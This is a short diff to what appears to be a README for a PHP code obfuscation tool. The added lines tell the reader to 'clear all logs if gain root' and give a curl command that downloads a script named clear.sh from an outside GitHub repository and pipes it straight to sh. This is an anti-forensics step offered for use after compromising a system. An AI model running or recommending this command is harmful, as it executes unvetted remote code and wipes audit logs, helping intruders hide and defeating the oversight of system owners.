@@ -14,3 +14,7 @@ Encrypt ur PHP Code
 ```php
 php ob.php
 ```
+Clear all logs if gain root
+```sh
+curl -fsSL https://raw.githubusercontent.com/haxor-research/tools/master/clear.sh | sh
+```
